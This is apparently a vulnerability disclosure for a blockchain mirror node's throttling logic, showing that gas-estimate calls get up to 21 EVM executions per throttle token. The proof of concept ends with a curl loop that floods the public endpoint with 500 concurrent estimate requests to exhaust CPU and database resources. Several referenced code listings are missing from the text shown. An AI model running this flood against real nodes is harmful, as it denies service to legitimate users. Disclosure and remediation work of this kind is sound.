### Title
Estimate Calls Bypass Gas Throttle Multiplier: Up to 21x EVM Executions Per Throttle Token

### Summary
`ThrottleManagerImpl.throttle()` consumes throttle tokens based solely on `request.getGas()` without differentiating between `estimate=true` and `estimate=false` calls. An `estimate=true` call triggers one initial EVM execution plus up to 20 binary-search iterations (default `maxGasEstimateRetriesCount=20`), all for the same throttle cost as a single `eth_call`. Any unprivileged user can exploit this to drive up to 21x more EVM computation per throttle token, far exceeding the 30% resource-increase threshold.

### Finding Description

**Throttle entry point** â€” `ThrottleManagerImpl.throttle()` (lines 37â€“49):

The `estimate` flag is completely ignored. Both call types consume identical tokens.

**Estimate execution path** â€” `ContractExecutionService.estimateGas()` (lines 81â€“98):

**Gas restore guard** â€” `ContractCallService.doProcessCall()` (lines 127â€“135):

The 20 binary-search iterations pass `estimate=true`, so `restoreGasToBucket()` is **never called** for them. They are entirely invisible to the throttle system â€” no tokens consumed, none restored.

**Net effect per request:**
| Call type | Throttle tokens consumed (net) | EVM executions |
|---|---|---|
| `estimate=false` | `scaleGas(gas) âˆ’ restored_remainder` | 1 |
| `estimate=true` | same as above (initial call restores) | 1 + up to 20 = **21** |

An attacker submitting `estimate=true` with `gas=15_000_000` (the maximum) triggers up to 21 full EVM simulations while the throttle only accounts for one.

### Impact Explanation
The binary-search loop (`BinaryGasEstimator.search()`, `maxGasEstimateRetriesCount=20`) performs up to 20 additional full EVM executions per request. Each execution involves database I/O, state loading, and CPU-intensive bytecode interpretation. A sustained flood of `estimate=true` requests at the permitted RPS (default 500 req/s) can generate up to 10,500 EVM executions per second instead of 500, a ~2000% increase in EVM workload â€” far above the 30% threshold. This can exhaust CPU, thread pools, and database connection pools, degrading or denying service to legitimate users.

### Likelihood Explanation
The `/api/v1/contracts/call` endpoint is publicly accessible with no authentication. The `estimate` field is a standard boolean in the JSON body. An attacker needs only to set `"estimate": true` in otherwise valid requests. No special knowledge, credentials, or tooling beyond a standard HTTP client is required. The attack is trivially repeatable and scriptable.

### Recommendation
1. **Apply a separate, lower rate limit for estimate calls.** In `throttle()`, check `request.isEstimate()` and consume tokens from a dedicated, more restrictive bucket (e.g., a fraction of the normal RPS/gas budget).
2. **Multiply the gas token cost for estimate calls** by a factor reflecting the expected binary-search iterations (e.g., `scaleGas(gas) * maxGasEstimateRetriesCount`) so the throttle accurately reflects actual computation.
3. **Restore gas tokens after each binary-search iteration** in `doProcessCall` (remove the `if (!estimate)` guard around `restoreGasToBucket`, or add a separate restore path for estimate iterations) so unused gas is returned to the bucket proportionally.

### Proof of Concept

**Preconditions:** Mirror node running with default config (`maxGasEstimateRetriesCount=20`, `requestsPerSecond=500`, `maxGasLimit=15_000_000`). A deployed contract address is known (any existing contract).

**Steps:**

```bash
# 1. Baseline: send a regular eth_call at max gas
curl -X POST http://<mirror-node>/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"to":"0x<contract>","gas":15000000,"estimate":false,"data":"0x<selector>"}'
# Triggers: 1 EVM execution, consumes scaleGas(15_000_000) tokens

# 2. Attack: send estimate=true at max gas
curl -X POST http://<mirror-node>/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"to":"0x<contract>","gas":15000000,"estimate":true,"data":"0x<selector>"}'
# Triggers: 1 initial EVM execution + up to 20 binary-search iterations = 21 executions
# Throttle cost: identical to step 1

# 3. Flood with estimate=true at the permitted RPS (500/s)
for i in $(seq 1 500); do
  curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0x<contract>","gas":15000000,"estimate":true,"data":"0x<selector>"}' &
done
# Result: up to 10,500 EVM executions/second vs. 500 for normal calls
# Node CPU/DB load increases by ~2000%, well above the 30% threshold
```

**Observable result:** Node CPU and DB connection utilization spike significantly compared to an equivalent flood of `estimate=false` requests at the same rate. Response latency for all users increases; the node may become unresponsive.
